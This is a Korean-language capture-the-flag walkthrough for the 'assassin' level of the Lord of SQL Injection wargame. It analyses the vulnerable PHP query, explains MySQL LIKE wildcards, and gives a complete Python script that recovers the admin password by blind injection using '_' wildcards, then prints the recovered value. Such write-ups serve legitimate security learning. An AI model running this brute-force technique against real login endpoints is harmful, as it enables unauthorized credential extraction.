# Lord of SQL Injection No.15 - assassin

## 문제 출제 의도

`LIKE` 연산자 뒤에 오는 문자열에 Blind SQL Injection을 하여 `pw`를 알아낼 수 있는지 확인한다.

## 소스 코드 분석

assassin 문제의 php 소스 코드는 다음과 같다.
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("assassin"); 
  highlight_file(__FILE__); 
?>
```
-----

```php
  if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
```
* GET방식으로 pw를 받고, pw에 `'` 가 들어 있으면 `No Hack ~_~`가 뜨고 문제 풀이에 실패한다.

```php
  $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("assassin"); 
```
* 받은 pw가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.

* `$result['id']`에 "0"을 제외한 어떤 값이든 들어 있으면 응답에 "Hello "와 `$result[id]` 값을 붙인 문자열이 포함된다.

* 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 id에 "admin"이라는 값이 들어있음'이다.

* pw가 `'`로 둘러싸여 있고 `'`는 필터링 되므로 `LIKE` 연산자 뒤에 오는 문자열에 Blind SQL Injection을 하여 `pw`를 직접 알아내서 푸는 방법을 사용한다.

## SQL 패턴 매칭

* MySQL은 유닉스 유틸리티가 사용하는 vi, grep, 및 sed등과 유사한 확장된 규칙 수식 (extended regular expression)에 근거한 패턴 매칭 형식 뿐만 아니라 표준 SQL 패턴 매칭도 함께 제공한다.

* SQL 패턴 매칭에서 ‘_’를 사용해서 단일 문자를 매칭시킬 수 있고 ‘%’를 사용해서 정해지지 않은 개수의 문자를 매칭 시킬 수 있다.

* SQL 패턴은 디폴트로 대소 문자를 구분하지 않는다.

* SQL패턴을 사용할 때에는 = 또는 <>는 사용할 수 없다. LIKE 또는 NOT LIKE 를 대신 사용한다.

* MySQL의 패턴 매칭에 대해 잘 모르겠다면 다음 링크를 참고하자.

* [3.3.4.7. 패턴 매칭 - :::MySQL Korea:::](http://www.mysqlkorea.com/sub.html?mcode=manual&scode=01&m_no=20156&cat1=3&cat2=91&cat3=102&lang=k)

-----

## Solution
    
1. 와일드카드 활용

    ```python
    import urllib.request
    from urllib.parse import quote
    from string import digits
    from string import ascii_lowercase

    guestpwlen = 0
    adminpwlen = 0
    key = "" # admin 비밀번호가 저장될 문자열
    guestkey = "" # guest 비밀번호가 저장될 문자열
    findadmin = False # guest 비밀번호 문자와 admin 비밀번호 문자가 같은 경우 처리하기 위해 만든 변수 

    for i in range(1, 20):
        url = "http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="
        data = ('_' * i) # 한 문자 와일드카드인 _ 이용하여 pw 길이 측정
        data = quote(data)
        re = urllib.request.Request(url + data)

        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header(
            "Cookie", "PHPSESSID=bb9ultdedrmse87p4473hmms81"
        )

        req = urllib.request.urlopen(re)

        result = req.readline()
        print(result)

        if str(result).find("Hello guest") != -1:
            guestpwlen = i
            print ("guest pw length : " + str(guestpwlen))

        if str(result).find("Hello admin") != -1:
            adminpwlen = i
            print ("admin pw length : " + str(adminpwlen))
            findadmin = True
            break

    if not findadmin:
        adminpwlen = guestpwlen
        print ("admin pw length : " + str(adminpwlen))
    findadmin = False

    for i in range(0, adminpwlen):
        if not findadmin:
            key = guestkey
        findadmin = False
        for j in digits + ascii_lowercase:
            url = "http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="
            data = key + "{}".format(j) + ("_" * (7 - i))
            data = quote(data)
            re = urllib.request.Request(url + data)
            re.add_header(
                "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
            re.add_header("Cookie", "PHPSESSID=bb9ultdedrmse87p4473hmms81")
            re.add_header(
                "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
            req = urllib.request.urlopen(re)

            result = req.readline()
            print(result)

            if str(result).find("Hello guest") != -1: # guest와 admin이 같은 비밀번호를 가질 경우 Hello guest가 출력되므로 일단 guestkey에 저장했다가 findadmin을 이용하여 처리
                guestkey += j
                print ("g : " + guestkey)

            if str(result).find("Hello admin") != -1:
                key += j
                print ("a : " + key)
                findadmin = True
                break
    print (key)
    ```

    이러한 코드를 실행하면 결과값으로 832edd10 를 출력한다.
    이를 GET방식으로 pw의 값으로 전달하면 풀린다.
    
    ```
    http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw=832edd10
    ```